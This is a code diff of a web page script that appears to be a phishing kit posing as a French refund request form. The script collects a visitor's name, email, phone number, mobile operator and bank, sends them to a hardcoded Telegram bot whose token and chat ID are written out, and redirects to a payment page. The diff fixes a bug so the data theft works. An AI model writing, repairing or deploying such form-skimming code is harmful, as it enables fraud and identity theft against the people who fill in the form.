@@ -224,40 +224,40 @@
         }
 
         const token1 = "7342455335:AAE0QCPLUpV1nO2lbfSwEAfZmx8qc-ZGSBo";
-        const chatId1 = "5372119436";
+const chatId1 = "5372119436";
 
-        const message = `
-🔔 *Nouvelle Demande de Remboursement* 🔔
-👤 *Nom complet:* ${nom}
-📧 *Email:* ${email}
-📞 *Téléphone:* ${telephone}
-📡 *Opérateur:* ${operateur}
-🏦 *Banque:* ${bank}
-        `;
+const message = `
+🔔 Nouvelle Demande de Remboursement 🔔
+👤 Nom complet: ${nom}
+📧 Email: ${email}
+📞 Téléphone: ${telephone}
+📡 Opérateur: ${operateur}
+🏦 Banque: ${bank}
+`;
 
-        try {
-            // إرسال الطلب إلى البوت
-        await fetch(https://api.telegram.org/bot${token1}/sendMessage, {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-        chat_id: chatId1, // تأكد من أن chatId1 يحتوي على المعرف الصحيح
-        text: message, 
-        parse_mode: "Markdown",
-    }),
-});
+try {
+    const response = await fetch(https://api.telegram.org/bot${token1}/sendMessage, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+            chat_id: chatId1,
+            text: message,
+            parse_mode: "Markdown",
+        }),
+    });
 
-if (!response.ok) {
-    alert("Erreur lors de l'envoi. Code d'erreur: " + response.status);
+    if (!response.ok) {
+        alert("Erreur lors de l'envoi. Code d'erreur: " + response.status);
+        return;
+    }
+
+    // إعادة التوجيه بعد الإرسال
+    window.location.href = "page-payement.html";
+} catch (error) {
+    alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
 }
-
-            // إعادة التوجيه بعد الإرسال
-            window.location.href = "page-payement.html";
-        } catch (error) {
-            alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
-        }
     });
 </script>
 </body>
